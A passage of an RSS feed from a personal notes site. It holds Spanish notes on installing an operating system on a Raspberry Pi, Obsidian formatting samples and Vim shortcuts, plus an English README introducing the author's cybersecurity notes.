<br>Una vez que dispongamos de todo lo necesario, simplemente deberemos introducir la Micro SSD a nuestro equipo, proceder con la descarga de la imagen ISO del Sistema Operativo que deseemos instalar en la Raspberry PI, descargar un software para bootear la Micro SSD y ejecutar este mismo para selecciónar la imagen ISO descargada y la unidad de almacenamiento extraible a la que se le realizará el booteo con la imagen ISO (Micro SSD). Una vez booteada la Micro SSD, simplemente desconectaremos esta, la conectaremos en el slot de la Micro SSD (En mi caso con el modelo Raspberry PI 3 B+ esta abajo), procedemos a conectar el cable de alimentación a la corriente para que funcione como fuente de nuestra Raspberry, un teclado en un puerto USB y un monitor al puerto HDMI y listo, tenemos nuestra mini computadora inicializando, simplemente quedará seguir el proceso de instalación y configuración y tendremos el sistema operativo instalado.]]></description><link>https://dobliuw.com/notes/6.-hardware/raspberry-pi/raspberry-pi.html</link><guid isPermaLink="false">Notes/6. Hardware/Raspberry PI/Raspberry PI.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 13 May 2024 15:29:07 GMT</pubDate></item><item><title><![CDATA[Cheat Sheat]]></title><description><![CDATA[ 
 <br><br><br>
<br> Checkers 
<br>Checkers
<br>
Testo informativo<br>
de ejemplo del color del titulo 
<br>Hipervinculos en <a data-tooltip-position="top" aria-label="https://raw.githubusercontent.com/ambionics/magento-exploits/master/magento-sqli.py" rel="noopener nofollow" class="external-link" href="https://raw.githubusercontent.com/ambionics/magento-exploits/master/magento-sqli.py" target="_blank">obsidian</a><br>La letra se puede poner en negrita<br>Relaciones entre notas <a data-href="Enumeración de Wordpress" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/gestores-de-contenido/wordpress/enumeración-de-wordpress.html" class="internal-link" target="_self" rel="noopener nofollow">Enumeración de Wordpress</a><br>print(f"Esto es para injectar {comandos}")
Copy<br>Referencias, palabra a explicar o adjuntar links ---&gt; Linux <a data-footref="1" href="https://dobliuw.com/#fn-1-6d6026e595c793a4" class="footnote-link" target="_self" rel="noopener nofollow">[1]</a><br><br>Tablas:<br><br>Ajustar imagenes: <br><img alt="Pasted image 20230215165507.png" height="200" src="https://dobliuw.com/lib/media/pasted-image-20230215165507.png" style="width: 200px; max-width: 100%;"><br>about:config ---&gt; browser.fixup.domainsuffixwhitelist.{termination_url}<br>
<br>
<br>El mejor sistema operativo del mundo<a href="https://dobliuw.com/#fnref-1-6d6026e595c793a4" class="footnote-backref footnote-link" target="_self" rel="noopener nofollow">↩︎</a>
]]></description><link>https://dobliuw.com/notes/take-notes-(important-for-me)/obsidian.html</link><guid isPermaLink="false">Notes/Take notes (Important for me)/Obsidian.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 14 Aug 2024 18:42:35 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/pasted-image-20230215165507.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/pasted-image-20230215165507.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Vim]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:editordetexto" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#editordetexto</a> <a class="tag" href="https://dobliuw.com/?query=tag:atajos" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#atajos</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:editordetexto" class="tag" target="_blank" rel="noopener nofollow">#editordetexto</a> <a href="https://dobliuw.com?query=tag:atajos" class="tag" target="_blank" rel="noopener nofollow">#atajos</a> 
<br><br><br><br><br><br><br><br>
<br>

Funciona como un Ctrl + z, vuelve para atrás el ultimo cambio.

<br>

Permite poner en modo visual el editor para trabajar sobre una selección texto.

<br>

Permite ingresar al mvodo para insertar comandos. 

<br>

Permite al usuario ingresar una string para buscar coincidencias. 

<br>

Modo interactivo, permite al usuario escribir.

<br>

Lleva el cursor del usuario hasta el principio de la línea en la que se encuentra. 

<br>

Lleva el cursor del usvuario hasta el final de la línea en la que se encuentra.}

<br>

Lleva el cursor del usuario hasta la siguiente palabra. 

<br>

Con una selección previamente hecha funciona para copiar la misma y sin selección para copiar todoa la línea.

<br>

Pega lo que este en la clipboard del usuario.

<br>

Inserta una nueva línea.

<br>

Bajar a la línea de abajo.

<br>

Eliminar líneas, palabras, selecciones, se combinan con teclas.

<br>

Repetir lo ultimo se realizo.

<br>

Supongamos que tengo mucho texto separado por , y quiero remplazarlo por un salto de línea: 

<br><br>Esto para remplazar el primer valor a cambiar por un nuevo valor, si quisiera aplicarlo para todos los matches debería agregar /g al final.<br><br><br>En el ejemplo de arriba remplazamos la , ( /,/ )  con un salto de línea ( /\r ). <br>
<br>

Con los números y las teclas anteriormente vistas se pueden realizar combinaciones muy potentes: 
<br><br>[ d +  2  + w ] --&gt; Eliminar 2 palabras.<br>
[ 3 + d + d ] --&gt; Eliminar 3 líneas.<br>
[ 3 + w ] ------&gt; Moverse 3 palabras a la derecha.<br>
[ d + w ]  -----&gt; Eliminar palabra.<br><br>Los macros son una secuencia de teclas que se repiten continuamente, los cuales se pueden grabar para posteriormente indicar que la secuencia de teclas grabada se realice un total de x veces. <br>Estos se pueden grabar con para una tecla en particular, por ejemplo, quiero hacer que a la hora de realizar un [ Esc ] + [ o ] se realice lo siguiente: <br>print("Dobliuw")<br>Por lo que podría presionar [ Esc ] + [ q ] + [ {tecla_to_macro} ] para indicar que quiero guardar un macro de lo que voy a realizar en la letra {{tecla_to_macro}}( [ o ] ) en el ejemplo mencionado. <br>Una vez presionado las teclas indicadas aparecerá recording @{tecla_to_macro} (recording @o), lo cual nos indica que estamos grabando una secuencia de teclas dentro de la letra "o". <br>Una vez finalizada la secuencia de teclas que nos interesa realizar, tocamos [ Esc ] + [ q ], y habríamos guardado la secuencia de teclas ingresada bajo la letra ingresada ( [ o ] ). <br>Para indicar que queremos que se realice el macro guardado lo hacemos con [ Esc ] + [ @ ] + [ {tecla_to_macro} ] ( [ Esc ] + [ @ ] + [ o ] )]]></description><link>https://dobliuw.com/notes/take-notes-(important-for-me)/vim.html</link><guid isPermaLink="false">Notes/Take notes (Important for me)/Vim.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 19 Dec 2023 15:38:17 GMT</pubDate></item><item><title><![CDATA[Dobliuw Hacking notes]]></title><description><![CDATA[ 
 <br><br><br>Welcome everyone, these are my notes, throughout my time in the world of technology, more specifically in Cybersecurity, I took the trouble to make explanatory notes of the concepts learned, uses made, technologies and automated tools learned, etc.<br><br>So the content that everyone will see here is basically:<br>
<br>RedTeam (Offensive hacking, exploits, privilege escalations, technologies, protocols, networks and more).
<br>BlueTeam (Defensive hacking, analysis, tools, this is the weakest branch of my notes).
<br><br>I invite you to clone the repository and use the <a data-tooltip-position="top" aria-label="https://obsidian.md/" rel="noopener nofollow" class="external-link" href="https://obsidian.md/" target="_blank">Obsidian</a> tool to read or/and modify the notes.<br>PS: The notes were made in Obsidian with the <a data-tooltip-position="top" aria-label="https://excalidraw.com/" rel="noopener nofollow" class="external-link" href="https://excalidraw.com/" target="_blank">Excalidraw</a> Plugin and the Border theme ( Just in case that you want to see everything same as me ;) ).]]></description><link>https://dobliuw.com/readme.html</link><guid isPermaLink="false">README.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 19:44:13 GMT</pubDate></item></channel></rss>